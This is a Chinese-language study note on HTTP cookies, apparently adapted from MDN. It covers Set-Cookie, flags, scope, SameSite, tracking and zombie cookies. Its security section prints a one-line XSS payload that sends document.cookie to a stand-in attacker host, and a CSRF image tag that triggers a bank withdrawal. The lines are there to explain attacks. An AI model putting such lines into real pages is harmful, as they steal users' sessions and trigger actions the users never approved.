---
cover: >-
  https://images.unsplash.com/photo-1643387959267-c84f40357e02?crop=entropy&cs=srgb&fm=jpg&ixid=MnwxOTcwMjR8MHwxfHJhbmRvbXx8fHx8fHx8fDE2NDYwMTE2OTQ&ixlib=rb-1.2.1&q=85
coverY: 0
---

# 🍒 HTTP cookies

### 简介

HTTP Cookie（Web Cookie）是**服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息**成为了可能。

Cookie主要用于以下三个方面：

* 会话状态管理（用户登录状态、购物车）
* 个性化设置（用户自定义设置、主题）
* 浏览器行为跟踪（跟踪分析用户行为） Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。

### 创建Cookie

当服务器收到HTTP请求时，服务器**可以在响应头里面添加一个Set-Cookie选项**。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过Cookie请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

#### Set-Cookie响应头部和Cookie请求头部

服务器使用Set-Cookie响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样： `Set-Cookie: <cookie名>=<cookie值>` 服务器通过该头部告知客户端保存Cookie信息

```javascript
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[页面内容]
```

现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过Cookie请求头部再发送给服务器

```javascript
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

#### 会话期Cookie

会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。**会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）**。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。

#### 持久性Cookie

持久性Cookie可以指定一个特定的**过期时间（Expires）或有效期（Max-Age）** (设定的日期和时间只与客户端相关，而不是服务端) `Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`

#### Cookie的Secure 和HttpOnly 标记

**标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端**。但即便设置了 Secure 标记，敏感信息也不应该通过Cookie传输，因为**Cookie有其固有的不安全性**，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记。

为避免跨域脚本 (XSS) 攻击，通过JavaScript的 Document.cookie API无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端。**如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记** `Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly`

#### Cookie的作用域

Domain 和 Path 标识定义了Cookie的作用域：即**Cookie应该发送给哪些URL**。

Domain 标识指定了哪些主机可以接受Cookie。**如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名。**

例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。

Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 **%x2F ("/") 作为路径分隔符**，子路径也会被匹配。

例如，设置 Path=/docs，则以下地址都会匹配：

* /docs
* /docs/Web/
* /docs/Web/HTTP

#### SameSite Cookies

**SameSite Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。**

SameSite cookies是相对较新的一个字段，所有主流浏览器都已经得到支持。

`Set-Cookie: key=value; SameSite=Strict`

* None

浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写,没有开启这个功能

* Strict

浏览器将只在访问相同站点时发送cookie。

* Lax

在新版本浏览器中，为**默认选项**，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如link链接，比较智能

#### JavaScript通过Document.cookie访问Cookie

通过Document.cookie属性可创建新的Cookie，也可通过该属性访问非HttpOnly标记的Cookie。

```javascript
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

JavaScript可以通过跨站脚本攻击（XSS）的方式来窃取Cookie。

### 安全

**当机器处于不安全环境时，切记不能通过HTTP Cookie存储、传输敏感信息。**

#### 会话劫持和XSS

在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击 `(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`

HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。

#### 跨站请求伪造（CSRF）

在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求： `<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">` 有一些方法可以阻止此类事件的发生：

* 对用户输入进行过滤来阻止XSS；
* 任何敏感操作都需要确认；
* 用于敏感信息的Cookie只能拥有较短的生命周期；

### 追踪和隐私

#### 第三方Cookie

每个Cookie都会有与之关联的域（Domain），如果Cookie的域和页面的域相同，那么我们称这个Cookie为**第一方Cookie（first-party cookie）**，如果Cookie的域和页面的域不同，则称之为**第三方Cookie（third-party cookie）**。一个页面包含图片或存放在其他域上的资源（如图片广告）时，第一方的Cookie也只会发送给设置它们的服务器。通过第三方组件发送的第三方Cookie主要用于**广告和网络追踪**。大多数浏览器默认都允许第三方Cookie，但是可以通过附加组件来阻止第三方Cookie（如EFF的Privacy Badger）。

#### 禁止追踪Do-Not-Track

请求首部 DNT (Do Not Track) 表明了用户对于网站追踪的偏好。它允许用户指定自己是否更注重个人隐私还是定制化内容。

* DNT:0 表示用户**愿意**目标站点追踪用户个人信息。
* DNT:1 表示用户**不愿意**目标站点追踪用户个人信息。

虽然并没有法律或者技术手段强制要求使用DNT，但是通过DNT可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。

#### 僵尸Cookie和删不掉的Cookie

Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类Cookie较难以删除，甚至删除之后会自动重建。它们一般是使用**Web storage API、Flash本地共享对象**或者其他技术手段来达到的。

如何做到僵尸cookie [evercookie，希望以后不会用到](https://github.com/samyk/evercookie)

### 说明

本文整理于https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E5%AE%89%E5%85%A8 为更简单方便的理解HTTp的技术
